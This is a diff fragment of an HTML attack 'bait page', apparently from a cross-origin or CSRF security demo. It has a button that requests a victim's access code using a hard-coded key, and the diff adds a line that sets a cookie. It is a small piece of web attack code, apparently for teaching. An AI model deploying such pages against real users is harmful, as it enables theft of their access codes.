@@ -7,10 +7,11 @@
 <body>
   <h1>Bait page</h1>
   <p>Click on the button below to request the victim's access code <br>
-  (using key: h4ack3r)</p>
+  (using auth key: 'h4ack3r' and cookie 'bad_cookie')</p>
   <button type="button" onclick="request()">Attack !</button>
   <pre id="log"></pre>
   <script>
+    document.cookie = 'bad_cookie';
     function reqListener () {
       var line = document.createElement('div');
       line.innerText = this.responseText;
